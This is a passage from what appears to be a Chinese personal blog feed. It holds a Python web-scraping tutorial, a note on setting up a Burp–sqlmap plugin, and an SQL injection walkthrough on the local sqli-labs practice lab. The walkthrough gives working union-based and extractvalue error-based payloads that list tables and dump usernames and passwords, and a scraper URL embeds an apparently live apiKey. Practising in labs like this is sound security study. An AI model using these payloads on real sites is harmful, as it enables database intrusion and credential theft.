class="string">&quot;请输入你需要翻译的中文(q-退出)：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> word == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;kw&#x27;</span>:word,</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(<span class="string">&quot;https://fanyi.baidu.com/sug&quot;</span>,data)</span><br><span class="line">        <span class="comment"># &#123;&quot;errno&quot;:997,&quot;errmsg&quot;:&quot;\u672a\u77e5\u9519\u8bef&quot;,&quot;logid&quot;:2920036812,&quot;query&quot;:&quot;\u72d7&quot;,&quot;from&quot;:&quot;zh&quot;,&quot;to&quot;:&quot;en&quot;,&quot;error&quot;:997&#125;</span></span><br><span class="line">        <span class="comment"># json</span></span><br><span class="line">        json_data = resp.json()</span><br><span class="line">        <span class="built_in">print</span>(json_data) <span class="comment">#获取数据格式</span></span><br><span class="line">        data_list = json_data[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span>  data_list:</span><br><span class="line">            <span class="built_in">print</span>(data[<span class="string">&#x27;k&#x27;</span>] + <span class="string">&quot;： &quot;</span> + data[<span class="string">&#x27;v&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240315223118283.png" alt="image-20240315223118283"></p><h2 id="爬美女图片"><a href="#爬美女图片" class="headerlink" title="爬美女图片"></a>爬美女图片</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;https://cdn.seovx.com/?mom=302&#x27;</span><br><span class="line">resp = requests.get(url=url)</span><br><span class="line">#print(resp.text)</span><br><span class="line">with open(&#x27;./tu.png&#x27;, mode=&#x27;wb&#x27;) as f:</span><br><span class="line">    f.write(resp.content)</span><br><span class="line">#print(&#x27;保存成功&#x27;)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240315231837221.png" alt="image-20240315231837221"></p><h2 id="爬视频"><a href="#爬视频" class="headerlink" title="爬视频"></a>爬视频</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url=<span class="string">&#x27;https://api.linhun.vip/api/Littlesistervideo?type=json&amp;apiKey=05961127134-89951501711-d6a79dfe896&#x27;</span></span><br><span class="line">resp = requests.get(url=url)</span><br><span class="line"><span class="built_in">print</span>(resp.json())</span><br><span class="line">url2 = resp.json()[<span class="string">&#x27;video&#x27;</span>]</span><br><span class="line"><span class="comment">#print(url2)</span></span><br><span class="line">content = requests.get(url=url2).content</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;girl.mp4&#x27;</span>, mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(content)</span><br></pre></td></tr></table></figure><p>要注意，里面有个apiKey是需要手动获取的，是为了防止恶意使用，然后这种别的媒体的形式，需要获取字节码，然后保存到相应格式的文件中。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p><strong>1.<strong><strong>访问</strong></strong><a href="https://news.sina.com.cn/roll/#pageid=153&lid=2509&k=&num=50&page=2">新浪微博网页</a></strong></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img"></p><p>查看网页源代码，可以发现这些新闻链接是通过js生成的，所以我们需要查看js页面</p><p>*<em>2.<strong><strong>分析</strong></strong>js</em>*<strong>页面</strong></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg" alt="img"></p><p>找到get请求返回的页面，查看信息，可以发现链接和标题都在里面，所以我们需要提取的页面是这个</p><p>*<em>3.<strong><strong>提取</strong></strong>js</em>*<strong>页面</strong></p><p>首先很明显是一个json格式，需要切片，转换格式，然后根据实际情况提取信息即可</p><p>  import json   import requests   url &#x3D; “<a href="https://feed.mix.sina.com.cn/api/roll/get?pageid=153&amp;lid=2509&amp;k=&amp;num=50&amp;page=2&amp;r=0.3009011709274978&amp;callback=jQuery111202890527579006905_1716863975570&amp;_=1716863975571&quot;">https://feed.mix.sina.com.cn/api/roll/get?pageid=153&amp;lid=2509&amp;k=&amp;num=50&amp;page=2&amp;r=0.3009011709274978&amp;callback=jQuery111202890527579006905_1716863975570&amp;_=1716863975571&quot;</a> <em>#</em> *替换为实际的页面链接 *  response &#x3D;  requests.get(url)   reply &#x3D; json.loads(response.text[46:-14])   <em>#print(len(reply[‘result’][‘data’]))</em>   for i in reply[‘result’][‘data’]:     *#print(i) *    print(i[“url”])     print(i[“title”])     </p><p>这里就不每个页面都提取了，如果需要提取，可以改成以下格式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for page_num in range(1, num):   url = &quot;https://feed.mix.sina.com.cn/api/roll/get?pageid=153&amp;lid=2509&amp;k=&amp;num=50&amp;page=&#123;&#125;&amp;r=0.3009011709274978&amp;callback=jQuery111202890527579006905_1716863975570&amp;_=1716863975571&quot;.format(page_num)   print(url)</span><br></pre></td></tr></table></figure><p>可以看看title和相应网页里面的标题是否一致</p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg" alt="img"></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg" alt="img"></p><p>可以看到标题和链接都是对应的，下面就是进入相应的网页提取文本和配图了</p><p>**4.**<strong>提取正文和配图</strong></p><p>进入目标页面，查看网页源代码，找到网页确定正文的逻辑</p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg" alt="img"></p><p>可以看到正文都是在id为artibody的div下，且每段文字都由p标签包裹，所以我们可以通过确定这两个元素来获取正文内容，需要注意的是当div为null时，是没有find_all方法的，我们需要先判断div元素是否存在。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*#* *判断* *&lt;div&gt;* *元素是否存在 *  if div_element is not None:   p_tags = div_element.find_all(&quot;p&quot;)   *#* *遍历每个* *&lt;p&gt;* *标签，获取内容 *   content = &quot;\n&quot;.join([p.text for p in p_tags])   *#* *提取配图链接 *   img_tags = div_element.find_all(&quot;img&quot;)   image_urls = [f&quot;https:&#123;img[&#x27;src&#x27;]&#125;&quot; for img in img_tags]   *#* *创建新闻文件夹 *   news_dir = os.path.join(save_dir, title)   os.makedirs(news_dir, exist_ok=True)   *#* *保存新闻标题和正文到文件 *   with open(os.path.join(news_dir, &quot;content.txt&quot;), &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:     f.write(content)</span><br></pre></td></tr></table></figure><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg" alt="img"></p><p>可以看到获取到了相应的正文内容，下面就是获取img了，同样的原理，获取相应的img标签即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*#* *提取配图链接 *  img_tags = div_element.find_all(&quot;img&quot;)  for img_tag in img_tags:  image_url=&quot;https:&quot; +img_tag.get(&quot;src&quot;)  print(image_url)  *#* *下载配图 *  image_response = requests.get(image_url)  image_name = os.path.basename(image_url)  image_path = os.path.join(&quot;news_data&quot;, image_name)  with open(image_path, &quot;wb&quot;) as f:   f.write(image_response.content)</span><br></pre></td></tr></table></figure><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg" alt="img"></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg" alt="img"></p><p>**5.**<strong>保存成对应的文件夹，并做异常处理</strong></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg" alt="img"></p><p>在img处添加try：catch</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*#* *下载配图并保存到文件 *  for i, image_url in enumerate(image_urls):   try:     response = requests.get(image_url)     image_name = f&quot;image_&#123;i+1&#125;.jpg&quot;     image_path = os.path.join(news_dir, image_name)     with open(image_path, &quot;wb&quot;) as f:       f.write(response.content)   except requests.exceptions.InvalidURL:     print(f&quot;Invalid URL: &#123;image_url&#125;&quot;)</span><br></pre></td></tr></table></figure><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg" alt="img"></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image022.jpg" alt="img"></p><p>完整代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义保存路径</span></span><br><span class="line">save_dir = <span class="string">&quot;news_data&quot;</span></span><br><span class="line">os.makedirs(save_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://feed.mix.sina.com.cn/api/roll/get?pageid=153&amp;lid=2509&amp;k=&amp;num=50&amp;page=2&amp;r=0.3009011709274978&amp;callback=jQuery111202890527579006905_1716863975570&amp;_=1716863975571&quot;</span>  <span class="comment"># 替换为实际的页面链接</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line">reply = json.loads(response.text[<span class="number">46</span>:-<span class="number">14</span>])</span><br><span class="line">links = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reply[<span class="string">&#x27;result&#x27;</span>][<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">    links.append(i[<span class="string">&quot;url&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">    response = requests.get(link)</span><br><span class="line">    response.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">    news_soup = BeautifulSoup(response.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取新闻标题</span></span><br><span class="line">    title = news_soup.find(<span class="string">&quot;h1&quot;</span>).text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取新闻正文</span></span><br><span class="line">    div_element = news_soup.find(<span class="string">&quot;div&quot;</span>, <span class="built_in">id</span>=<span class="string">&quot;artibody&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断 &lt;div&gt; 元素是否存在</span></span><br><span class="line">    <span class="keyword">if</span> div_element <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        p_tags = div_element.find_all(<span class="string">&quot;p&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历每个 &lt;p&gt; 标签，获取内容</span></span><br><span class="line">        content = <span class="string">&quot;\n&quot;</span>.join([p.text <span class="keyword">for</span> p <span class="keyword">in</span> p_tags])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取配图链接</span></span><br><span class="line">        img_tags = div_element.find_all(<span class="string">&quot;img&quot;</span>)</span><br><span class="line">        image_urls = [<span class="string">f&quot;https:<span class="subst">&#123;img[<span class="string">&#x27;src&#x27;</span>]&#125;</span>&quot;</span> <span class="keyword">for</span> img <span class="keyword">in</span> img_tags]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建新闻文件夹</span></span><br><span class="line">        news_dir = os.path.join(save_dir, title)</span><br><span class="line">        os.makedirs(news_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 保存新闻标题和正文到文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(news_dir, <span class="string">&quot;content.txt&quot;</span>), <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 下载配图并保存到文件</span></span><br><span class="line">        <span class="keyword">for</span> i, image_url <span class="keyword">in</span> <span class="built_in">enumerate</span>(image_urls):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.get(image_url)</span><br><span class="line">                image_name = <span class="string">f&quot;image_<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>.jpg&quot;</span></span><br><span class="line">                image_path = os.path.join(news_dir, image_name)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(image_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(response.content)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.InvalidURL:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Invalid URL: <span class="subst">&#123;image_url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Saved news: <span class="subst">&#123;title&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;No content found for: <span class="subst">&#123;title&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Xpath解析"><a href="#Xpath解析" class="headerlink" title="Xpath解析"></a>Xpath解析</h2><p>xpath各种用法节点: 每个HTML标签叫节点最外层节点:</p><p> 根节点内层节点: 子节点父子节点: &lt;爹&gt;&lt;子&gt;&lt;&#x2F;子&gt;&lt;&#x2F;梦&gt;</p><p>xpath提取到的内容不论多少，都会返回列表</p><p><a href="https://desk.zol.com.cn/%E5%A3%81%E7%BA%B8%E7%BD%91%E7%AB%99https://desk.zol.com.cn/meinv/">https://desk.zol.com.cn/壁纸网站https://desk.zol.com.cn/meinv/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> pthon </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burp+sqlmap</title>
      <link href="/2024/03/14/burp-sqlmap/"/>
      <url>/2024/03/14/burp-sqlmap/</url>
      
        <content type="html"><![CDATA[<h1 id="burp-sqlmap"><a href="#burp-sqlmap" class="headerlink" title="burp+sqlmap"></a>burp+sqlmap</h1><p>第一步：Extend-&gt;BApp store-&gt;SQLIpy Sqlmap Interation</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314185825308.png" alt="image-20240314185825308"></p><p>要先安装一下jython<a href="https://www.jython.org/download.html">https://www.jython.org/download.html</a></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314191141359.png" alt="image-20240314191141359"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314191049446.png" alt="image-20240314191049446"></p><p>连接失败，去这个网站<a href="https://portswigger.net/bappstore/%E4%B8%8B%E8%BD%BD">https://portswigger.net/bappstore/下载</a></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314192650903.png" alt="image-20240314192650903"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314192707918.png" alt="image-20240314192707918"></p><p>如果启动时会报错，可能时jyphon有问题，去重新下或换个版本就行</p>]]></content>
      
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql</title>
      <link href="/2024/03/02/sql/"/>
      <url>/2024/03/02/sql/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>1、查找注入点</p><p>2、判断是字符型还是数字型注入 </p><p>3、如果字符型，找到他的闭合方式</p><p>4、判断查询列数，group by 或 order by</p><p>5、查询回显位置 -1（id要是不存在的数据）</p><h2 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h2><ul><li><p>按照查询字段</p><ul><li>字符型:输入参数为整形</li><li>数字型:输入参数为字符型</li></ul></li><li><p>按照注入方法</p><ul><li>Union注入</li><li>报错注入</li><li>布尔注入</li><li>时间注入</li></ul></li></ul><h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><p>注入点就是可以实行注入的地方，通常是一个访问数据库的连接，如本页面的注入点input the ID</p><h3 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131141452662.png" alt="image-20240131141452662"></p><h2 id="如何判断是字符型还是数字型"><a href="#如何判断是字符型还是数字型" class="headerlink" title="如何判断是字符型还是数字型"></a>如何判断是字符型还是数字型</h2><p>实用and 1&#x3D;1 和and 1&#x3D;2来判断，数字型一般提交内容为数字，但数字不一定为数字型。</p><p>Less-1 提交and 1&#x3D;1和提交and 1&#x3D;2，如果是数字型，你1&#x3D;2就不会正常显示，是字符型则仍能正常显示，这里是字符型</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131142319694.png" alt="image-20240131142319694"></p><p>Less-2则是数字型了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131142425527.png" alt="image-20240131142425527"></p><p>也可以直接用运算2-1如果显示的是2的数据则是字符型，注意+号会被认为是空格</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131142754670.png" alt="image-20240131142754670"></p><h2 id="闭合方式"><a href="#闭合方式" class="headerlink" title="闭合方式"></a>闭合方式</h2><p>一个单引号-‘</p><p>两个单引号’’</p><p>一个单引号’+)</p><p>两个单引号’’+)</p><p>或双引号</p><p>其他</p><h3 id="如何判断闭合方式"><a href="#如何判断闭合方式" class="headerlink" title="如何判断闭合方式"></a>如何判断闭合方式</h3><p>例如Less-1输入?id&#x3D;1’‘’报错为 near ‘’1’’’’ LIMIT 0,1多一个’闭合符为‘’,还有一个–+ 可以把面的内容注释掉</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131151415891.png" alt="image-20240131151415891"></p><p>在Less-3中先输入一个’会报错，可以看到有个括号,</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131151501215.png" alt="image-20240131151501215"></p><p>这时候可以括号闭合，再注释后面的内容</p><h3 id="闭合的作用"><a href="#闭合的作用" class="headerlink" title="闭合的作用"></a>闭合的作用</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131151703697.png" alt="image-20240131151703697"></p><h2 id="Union联合注入"><a href="#Union联合注入" class="headerlink" title="Union联合注入"></a>Union联合注入</h2><p>提交：?id&#x3D;1’ union select database () –+</p><p>需要注意列数，可以先group by + 数字判断列数</p><p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> group by 4–+到四就报错了，说明有3列，用二分法就好了，还可以order by + 数字</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131152330244.png" alt="image-20240131152330244"></p><p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> union select 1,2,3–+</p><p>列数要一致，但有时候不一定都显示，所以我们需要放在可以显示的列，phpmyadmin没用了。。</p><p>select * from users where id&#x3D;’1’ union select 1,2,3;</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131153436408.png" alt="image-20240131153436408"></p><p>但页面只显示第一行，所以可以把id设置成-1</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131153600297.png" alt="image-20240131153600297"></p><p><a href="http://localhost/sqli-labs/Less-1/?id=-1&#39;">http://localhost/sqli-labs/Less-1/?id=-1&#39;</a> union select 1,2,database()–+</p><p>所以可以将3换成database()就可以查到库名了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131212132753.png" alt="image-20240131212132753"></p><p>2也可以用，但1不行，因为1没有回显位，version()可以用来显示版本</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131212742386.png" alt="image-20240131212742386"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,version(),databse() --+</span><br></pre></td></tr></table></figure><p>页面只能显示一个内容,第二句的内容是不显示的，可以把第- -的内容改为数据库不存在的数据，如id&#x3D;0。</p><p>?id&#x3D;1’ union select 1,2,database() –+</p><h3 id="关键数据库、数据表、数据列、group-concat作用"><a href="#关键数据库、数据表、数据列、group-concat作用" class="headerlink" title="关键数据库、数据表、数据列、group_concat作用"></a>关键数据库、数据表、数据列、group_concat作用</h3><ul><li>数据库：Information_schema（包含所有mysql数据库的简要信息）<ul><li>数据表：tables<ul><li>表名集合表</li></ul></li><li>数据表：columns<ul><li>列名集合表</li></ul></li></ul></li></ul><p>但waf对这个有防御，不怎么容易用上</p><h3 id="查找表名"><a href="#查找表名" class="headerlink" title="查找表名"></a>查找表名</h3><p>走到确定回显位的时候</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,table_name,3 from information_schema.tables --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131214415498.png" alt="image-20240131214415498"></p><p>但里面数据这么多，这里只显示一个，所以需要限制条件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,table_name,3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131214715798.png" alt="image-20240131214715798"></p><p>也可以直接用刚刚得到的数据库名，但函数更好用一些，有的防火墙不一定过滤函数</p><p>但表名还是只能显示一个，这是时候就要用到**group_concat()**把多个列名合在一起</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure><p>把table_name作为参数放到group_concat()函数就可以了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131215006002.png" alt="image-20240131215006002"></p><h3 id="查找列名"><a href="#查找列名" class="headerlink" title="查找列名"></a>查找列名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,column_name,3 from information_schema.columns --+</span><br></pre></td></tr></table></figure><p>同样的思路，最终语句如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=databse() and table_namme=&#x27;你需要的那个表&#x27;--+</span><br></pre></td></tr></table></figure><p>我这里以user表为例子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131221726938.png" alt="image-20240131221726938"></p><p>我们也可以在mysql里直接看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show columns from security.users;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131222241062.png" alt="image-20240131222241062"></p><p>确实是这三个</p><h3 id="查找最终目标"><a href="#查找最终目标" class="headerlink" title="查找最终目标"></a>查找最终目标</h3><p>查找里面的内容，比如我们要获取user表里的username和password，一样的思路</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(username,password),3 from users --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131224502718.png" alt="image-20240131224502718"></p><p>聚在一起不好看，可以插入”~”区分数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(username,&#x27;~&#x27;,password),3 from users --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131224606034.png" alt="image-20240131224606034"></p><h3 id="数字型union注入"><a href="#数字型union注入" class="headerlink" title="数字型union注入"></a>数字型union注入</h3><h4 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h4><ol><li>确定数字型还是字符型</li><li>使用group by的二分法判断union语句中前一个查询的列数</li><li>优化语句，将id改为一个不存在的数字</li><li>使用select语句，查询靶机数据库库名</li><li>使用select语句，查询靶机所有表名</li><li>使用select语句，查询靶机所有列名</li><li>查询所有用户名密码</li></ol><h3 id="拿Less2练练手"><a href="#拿Less2练练手" class="headerlink" title="拿Less2练练手"></a>拿Less2练练手</h3><p>一样，判断注入点？id&#x3D;1有回显</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131225137471.png" alt="image-20240131225137471"></p><p>然后id&#x3D;2-1判断类型</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131225153111.png" alt="image-20240131225153111"></p><p>结果和id&#x3D;1一样，所以是数字型，就不加’了，在最后加个#号注释即可，或–+，查列数id&#x3D;1 order by 3 –+，和之前一样是三列</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131225347565.png" alt="image-20240131225347565"></p><p>判断回显位置,这里就不用1，2，3了,注意id要是-1或者0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,version(),database() --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131225633817.png" alt="image-20240131225633817"></p><p>知道回显位置后，查表名（库名知道了）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables  where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131225915149.png" alt="image-20240131225915149"></p><p>查到表名再查列名，因为回显得是name和password，那就查这个，试试user表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(column_name),3 from information_schema.columns  where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131230226025.png" alt="image-20240131230226025"></p><p>结果一样的，没什么变化，再查具体信息,这里就不加~了，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(username,password),3 from users --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131230324541.png" alt="image-20240131230324541"></p><p>差不多就是这样</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131232843853.png" alt="image-20240131232843853"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201151543752.png" alt="image-20240201151543752"></p><p>重要的是前三个，后面不怎么见到</p><h4 id="通过extractValue-报错注入"><a href="#通过extractValue-报错注入" class="headerlink" title="通过extractValue()报错注入"></a>通过extractValue()报错注入</h4><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201152540772.png" alt="image-20240201152540772"></p><p>这是数据库words中的一个表xml，里面有个doc字段为varchar(50),再插入两个xml代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into xml values(&#x27;&lt;book&gt;&lt;title&gt;A bad boy how to get agirlfriend&lt;/title&gt;&lt;author&gt;&lt;initial&gt;Love&lt;/initial&gt;&lt;surname&gt;benben&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;&#x27;);</span><br><span class="line">insert into xml values(&#x27;&lt;book&gt;&lt;title&gt;how to become a bad boy&lt;/title&gt;&lt;author&gt;&lt;initial&gt;hualong&lt;/initial&gt;&lt;surname&gt;Melton&lt;/surname&gt;</span><br><span class="line">&lt;/author&gt;</span><br><span class="line">&lt;/book&gt;&#x27;);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201153602460.png" alt="image-20240201153602460"></p><p>下面事着查询一下作者是谁，extractValue有两个参数第一个是列名，后一个是路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractValue(doc,&#x27;/book/author/surname&#x27;) from xml;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201154031658.png" alt="image-20240201154031658"></p><p>查书名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractValue(doc,&#x27;/book/title&#x27;) from xml;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201154118824.png" alt="image-20240201154118824"></p><p>下面来看看报错，你目录里面错了几个字母，他只是找不到东西，而添加了其它符号，他就会返回错误信息，比如在前面加上~</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201154805130.png" alt="image-20240201154805130"></p><p>所以，在报错之前，让报错回显我们想要的信息，比如库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractValue(doc,concat(0x7e,(select database()))) from xml;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201155248760.png" alt="image-20240201155248760"></p><p>拿Less-5试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,extractvalue(1,concat(0x7e,(select database()))),3 --+</span><br></pre></td></tr></table></figure><p><img 